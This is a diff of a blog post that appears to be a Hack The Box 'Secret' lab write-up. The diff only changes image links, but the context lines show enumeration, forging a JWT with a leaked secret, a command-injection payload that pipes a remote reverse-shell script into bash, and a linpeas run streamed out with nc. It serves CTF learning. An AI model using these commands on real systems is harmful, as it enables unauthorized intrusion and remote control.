@@ -289,16 +289,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre></div><p>Based on the output from NMAP, the web-server and a NodeJS service is running on port <code>80</code> and <code>3000</code>, respectively. There is also a SSH listening on port <code>22</code>, however, it is not exploitable even in these easy-rated machines, at least from my own experience. So, let us pay our attention to the former two.</p>
 <h3 id="web-server">Web-server<a href="#web-server" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Visiting either <code>10.10.11.120:80</code> or <code>10.10.11.120:3000</code> does provide you with the same webpage.</p>
-<p><img src="D:%5CDevelopment%5Cgithub%5Crepos%5Cimage-host%5C2022-01-13-HTB-Secret%5Csecret1.gif" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/secret1.gif" alt=""></p>
 <p>You can see why this box is rated easy since it presumably enables us to download its source code in the last section. Beside that and the <strong>Live Demo</strong> feature, there are no other feasible or potential vectors around but some protracted documentation.</p>
 <p><strong>Live Demo</strong> redirects us to a assumed API endpoint running on the server.</p>
-<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-14_08-08.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-14_08-08.png" alt=""></p>
 <p>Normally, we would use auxiliaries to enumerate the endpoint, and <code>dirb</code>, <code>gobuster</code> are my favorites. There is, nevertheless, a trivial problem that when using <code>gobuster</code>, you will probably encounter the following error.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
 └─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,txt,html -t <span style="color:#ae81ff">50</span> -o gobuster.txt
 Error: the server returns a status code that matches the provided options <span style="color:#66d9ef">for</span> non existing urls. http://10.10.11.120/api/767c3163-5f9d-4235-b2ec-3c8766da50ab <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">200</span> <span style="color:#f92672">(</span>Length: 93<span style="color:#f92672">)</span>. To <span style="color:#66d9ef">continue</span> please exclude the status code, the length or use the --wildcard switch
 </code></pre></div><p>This happens due to the web-server is prone to be configurated to always response with <code>200 OK</code> code. You can verify this again by sending a <code>CURL</code> request to a non-existing page.</p>
-<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-14_08-50.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-14_08-50.png" alt=""></p>
 <p>On that account, we have to exclude <code>200 OK</code> responses and, hence, our command should look like this:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
 └─$ gobuster dir -q -u http://10.10.11.120/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b <span style="color:#e6db74">&#34;200&#34;</span> -x php,bak,txt,html -t <span style="color:#ae81ff">50</span> -o gobuster.txt
@@ -321,7 +321,7 @@ END_TIME: Thu Jan <span style="color:#ae81ff">13</span> 20:28:03 <span style="co
 DOWNLOADED: <span style="color:#ae81ff">4612</span> - FOUND: <span style="color:#ae81ff">3</span>
 ...
 </code></pre></div><p>All these enumerated paths, however, are inaccessible without valid credentials as their responses are <code>401</code> with an <strong>Access Denied</strong> message. Despite being restricted, we are able to get the gist of what we should do next.</p>
-<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-15_10-41.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-15_10-41.png" alt=""></p>
 <h3 id="source-code-analysis">Source code analysis<a href="#source-code-analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>In this step, let us have a look at the open-source project provided which can be download at the bottom of the homepage.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
@@ -752,9 +752,9 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWViZGMwNTBkMTdhMjA0NWQxNTI0MjQ
 ...
 </code></pre></div><p>As the above snippet suggested, <code>auth-token</code> in our header request with its <code>TOKEN_SECRET</code> are to be verified, the request is then passed to <code>/api/priv</code> or <code>/api/logs</code> for a username comparison and we therefrom have access to the protected resources which are required for the later stage.</p>
 <p>Usually, when dealing with JWT, one of my favorites is <a href="https://JWT.io">JWT.io</a> because of its straightforward and friendly design but you can always have an alternative <a href="https://github.com/ticarpi/jwt_tool">CLI option</a> in case internet is not available or whatever your reason is. Anyway, we are going with the web version and conveniently paste the received token there.</p>
-<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-22_21-35.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-22_21-35.png" alt=""></p>
 <p>In the previous enumeration step, we have known <code>.env</code> is from which to look for the secret key. Ergo, we can easily snatch it from the file yet that was just what I thought and consequently, it did take a plenty of time for me to figure out where the <em>original</em> one is. Try having a guess before you carry on to the solution.</p>
-<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-25_09-49.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-25_09-49.png" alt=""></p>
 <p>And I expect you still remember the extracting process with GitTools in our initial enumeration as it now provides the original <code>TOKEN_SECRET</code>. With that in mind, let us skim through the dumped contents.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>legiahuyy㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/HTB/Boxes/Secret<span style="color:#f92672">]</span>
 └─$ ls -l ./www/extracted 
@@ -774,7 +774,7 @@ drwxr-xr-x <span style="color:#ae81ff">7</span> legiahuyy kali <span style="colo
 DB_CONNECT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
 TOKEN_SECRET <span style="color:#f92672">=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
 </code></pre></div><p>Thanks to this, we now have the correct token to impersonate <code>theadmin</code>. As I have mentioned earlier, it is only necessary to modify <code>&quot;name&quot;</code>.</p>
-<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-01-26_16-05.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-26_16-05.png" alt=""></p>
 <p>We then can send a request to the <code>/api/priv</code> endpoint to test out the newly forged token using Burpsuite.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">// Request
 </span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#a6e22e">GET</span> /api/priv <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
@@ -833,7 +833,7 @@ ETag: W/&#34;4d-xY8AsU/eUR22Yy/Fqfzp+1blTxU&#34;
 <p><em><strong>Note:</strong> URL encoding is mandatory to perform complex input with special characters (spaces, dashes, etc.).</em></p>
 <pre tabindex="0"><code>Prints CURL's version
 file=-;curl --version
-</code></pre><p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-08_13-19.png" alt=""></p>
+</code></pre><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-02-08_13-19.png" alt=""></p>
 <p>After guaranteeing that our code is fully functional, let us connect to the remote machine via a simple reverse shell.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create a reverse shell script and save it under ./www/rs.sh</span>
 <span style="color:#75715e">#!/bin/bash</span>
@@ -849,7 +849,7 @@ $ rlwrap -cAr nc -lvnp <span style="color:#ae81ff">9001</span>
 <span style="color:#75715e"># Send the RCE payload to the server</span>
 <span style="color:#75715e"># -;curl http://10.10.14.9:8088/rs.sh | bash</span>
 </code></pre></div><p>And we get ourselves a shell on the server, navigate to <code>$HOME</code> and read the user&rsquo;s flag.</p>
-<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-08_14-41.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-02-08_14-41.png" alt=""></p>
 <h3 id="stage-3-privilege-escalation">Stage 3: Privilege Escalation<a href="#stage-3-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>In this final stage, I would want to use <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>, one of my favorite enumeration tools, to aid us in gaining a better understanding of the target system. You can either inspect the output on-the-fly or stream it back to your machine for a more convenient examination.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># On victim&#39;s machine</span>
@@ -861,7 +861,7 @@ $ curl http://10.10.14.9:8088/linpeas.sh | bash | nc 10.10.14.9 <span style="col
 $ nc -lvnp <span style="color:#ae81ff">9002</span> | tee linpeas.output
 $ cat linpeas.output
 </code></pre></div><p>A lot of noises notwithstanding, LinPEAS does find <code>/opt/count</code>, an intriguing binary with SUID bit</p>
-<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-09_10-26.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-02-09_10-26.png" alt=""></p>
 <p>and its provided source code.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e"># /opt/code.c
 </span><span style="color:#75715e"></span>
